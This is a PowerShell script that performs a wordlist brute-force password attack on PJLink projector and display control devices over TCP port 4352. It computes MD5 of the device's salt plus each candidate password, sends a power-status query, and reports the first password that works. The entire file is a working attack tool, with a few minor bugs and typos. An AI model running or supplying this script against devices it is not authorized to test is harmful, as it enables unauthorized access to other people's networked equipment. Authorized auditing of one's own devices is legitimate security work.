<#  
.SYNOPSIS  
    This script do worlist attack against pjlink       
.DESCRIPTION  
    Script takes passwords from worlist (one IP per line) and test against pjlink device.
.NOTES  
    File Name      : pjlink_pass_bf.ps1  
    Author         : Jiri Kindl; kindl_jiri@yahoo.com
    Prerequisite   : PowerShell V2 over Vista and upper.
    Version        : 20191206
    Copyright 2019 - Jiri Kindl    
.LINK  
    
.EXAMPLE  
    .\pjlink_pass_bf.ps1 -device IP -passlist passlistfile [-port NUMBER]"
#>

param([string]$device,
[int]$port = 4352,
[string]$passlist,
[switch]$help
)

function ReadStream {

param(
        [Parameter(Mandatory=$true, Position=0, HelpMessage='TCP Socket')] 
        [Alias("s")] 
        [ValidateScript({$_.GetType().name -eq 'TcpClient'})]
        $Socket              
       ) 
        
begin {
  $Bytes = New-Object System.Byte[] $Socket.ReceiveBufferSize
  $Encoding = New-Object System.Text.AsciiEncoding
}
process {

  if (!($socket.Connected)) {
    return "Socket not connected"
    break
  }
  $timer = 0
  while (-not($Socket.GetStream().DataAvailable)) {
    sleep -m 10
    $timer++
      if ($timer -gt 30000) {
        return "Timeout"
        break
      }
    }
    while($Socket.GetStream().DataAvailable) {
      try {
        $Read = $stream.Read($Bytes, 0, $Socket.ReceiveBufferSize )
      }
      catch {
        return "Error occurred while reading stream"
        break
      }  
	  return ($Encoding.GetString($Bytes, 0, $Read)).trim()
    }
  }
}

Function usage {
  "pjlink_pass_bf.ps1 -device IP -passlist passlistfile [-port NUMBER]"
  "device - IP, Hostname or FQDN of pjlink device"
  "passlist - file with passwords to try, one password per line"
  "port NUMBER - number of pjlink port, default 4352"
  exit
}

Function CloseConnection {
  $Writer.Dispose()
  $Writer.close()
  $Socket.Dispose()
  $Socket.close()
}

Function TestPJLinkPassword($password, $device, $port) {
  
  $state = 'init'
  #Possible states
  #init - before any communication starts
  #auth_p1 - pjlink server sends salt (random 4 bytes number)
  #auth_p2 - pjlink clinet sends MD5(Salt+Pass)+Command
  #auth_p3 - pjlink decline or respond to Command
  
  $command = '%1POWR ?'
  $LoginResultMessage = "UNKNOWN"
  $LoginResultCode = 30
   
  # $LoginResultCodes     | $LoginResultCode
  # ----------------------+------------------
  # "Cannot Connect"      | 11
  # "Wrong password"      | 12
  # "No authentification" | 21
  # "Working passwrod"    | 22
  # "UNKNOWN"             | 30

  try { 
    $Socket = New-Object System.Net.Sockets.TcpClient($device, $port)}
  catch {
    if ($Error.exception -match "A connection attempt failed") {
      $LoginResultMessage = "Cannot Connect"
      $LoginResultCode = 11
      $passTestResult = @{Device = $device; Port = $port; Password = $password; LoginResultMessage = $LoginResultMessage; LoginResultCode = $LoginResultCode }
      return $passTestResult
    }
  }

  $stream = $Socket.GetStream()
  $Writer = New-Object System.IO.StreamWriter($Stream)

  Start-Sleep -m 10

  $state = 'init'
  $command = '%1POWR ?'

  while ($Socket.Connected) {
    #$state
    $RecievedData = ReadStream $Socket
    switch($state) {
      'init' {
        switch -Regex ($RecievedData){
          '^PJLINK 0$' {
            $LoginResultMessage = "No authentification"
            $LoginResultCode = 21
            CloseConnection
            break
          }
          '^PJLINK 1 .*' {
            #$RecievedData
            $salt = $RecievedData -replace 'PJLINK 1 '
            $pANDs = $salt + $password
            #$pANDs
            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $utf8 = new-object -TypeName System.Text.UTF8Encoding
            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($pANDs)))
            #to remove hyphens and downcase letters add:
            $hash = $hash.ToLower() -replace '-', ''
            $command = $hash+$command
            $command
            $Writer.WriteLine($command)
            $Writer.Flush()
            $state = 'auth_p2'
            continue
          }
          default {
      
          }
        }
      }
      'auth_p1' {}
      'auth_p2' {
        switch -Regex ($RecievedData){
          '^PJLINK ERRA$' {
            $LoginResultMessage = "Wrong password ($RecievedData)"
            $LoginResultCode = 12
            CloseConnection
            break
          }
          '^%1POWR=.*' {
            $LoginResultMessage = "Working passwrod: $password"
            $LoginResultCode = 22 
            CloseConnection
            break
          }
          '^Timeout$' {
            CloseConnection
            break
          }
          default {
            $RecievedData
          }
        }
      }
      'auth_p3' {}
    }
  }
  $passTestResult = @{Device = $device; Port = $port; Password = $password; LoginResultMessage = $LoginResultMessage; LoginResultCode = $LoginResultCode }
  return $passTestResult
}

if ((!$passlist) -or (!$device) -or ($help)) {
  usage
}

try {
  $passwords=get-content $passlist -ErrorAction Stop
}
catch [System.Management.Automation.ItemNotFoundException] {
  "No such file: $passlist"
  ""
  usage

}


foreach ($pass in $passwords) {
  $testPassResult = TestPJLinkPassword $pass $device $port
  if ( ($testPassResult.LoginResultCode -gt 20) -and ($testPassResult.LoginResultCode -lt 30) ) {
    if ($testPassResult.LoginResultCode -gt 22) {
      $testPassResult = TestPJLinkPassword $pass $device $port
      if ($testPassResult.LoginResultCode -gt 22) {
        $testPassResult | Format-Table
        break
      }
    }
    else {
      $testPassResult | Format-Table
      break
    }
  }
  elseif ($testPassResult.LoginResultCode -eq 11) {
    "WARNING:"
    $testPassResult | Format-Table
  }
}